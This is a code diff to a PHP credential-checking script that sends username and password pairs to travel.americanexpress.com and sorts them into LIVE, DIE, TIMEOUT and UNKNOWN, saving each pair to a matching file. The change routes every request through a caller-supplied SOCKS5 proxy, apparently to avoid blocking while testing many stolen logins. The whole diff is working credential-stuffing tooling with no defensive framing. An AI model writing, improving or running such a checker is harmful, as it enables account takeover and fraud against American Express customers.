@@ -85,6 +85,11 @@ if (!isset($_REQUEST['empas']))
 
   $curl   =  new Curl();
 
+  $curl->setOpt(CURLOPT_HTTPPROXYTUNNEL, TRUE);
+  $curl->setOpt(CURLOPT_PROXY, $_REQUEST['sock']);
+  $curl->setOpt(CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
+  $curl->setOpt(CURLOPT_TIMEOUT_MS, 5000);
+
   $curl->setHeader('Host', 'travel.americanexpress.com');
   $curl->setHeader('Upgrade-Insecure-Requests', '1');
   $curl->setHeader('Origin', 'null');
@@ -108,7 +113,8 @@ if (!isset($_REQUEST['empas']))
   if (!$postAmex) {
     $result = [
       'status'  =>  'TIMEOUT',
-      'empas'   =>  $username . '|' . $password
+      'empas'   =>  $username . '|' . $password,
+      'sock'    =>  $_REQUEST['sock']
     ];
 
     save('cant', $username . '|' . $password);
@@ -116,7 +122,8 @@ if (!isset($_REQUEST['empas']))
 
     $result = [
       'status'  =>  'DIE',
-      'empas'   =>  $username . '|' . $password
+      'empas'   =>  $username . '|' . $password,
+      'sock'    =>  $_REQUEST['sock']
     ];
 
     save('die', $username . '|' . $password);
@@ -124,7 +131,8 @@ if (!isset($_REQUEST['empas']))
 
     $result = [
       'status'  =>  'LIVE',
-      'empas'   =>  $username . '|' . $password
+      'empas'   =>  $username . '|' . $password,
+      'sock'    =>  $_REQUEST['sock']
     ];
 
     save('live', $username . '|' . $password);
@@ -133,7 +141,8 @@ if (!isset($_REQUEST['empas']))
     $result = [
       'code'    =>  $curl->getHttpStatusCode,
       'status'  =>  'UNKNOWN',
-      'empas'   =>  $username . '|' . $password
+      'empas'   =>  $username . '|' . $password,
+      'sock'    =>  $_REQUEST['sock']
     ];
 
     save('unknown', $username . '|' . $password);
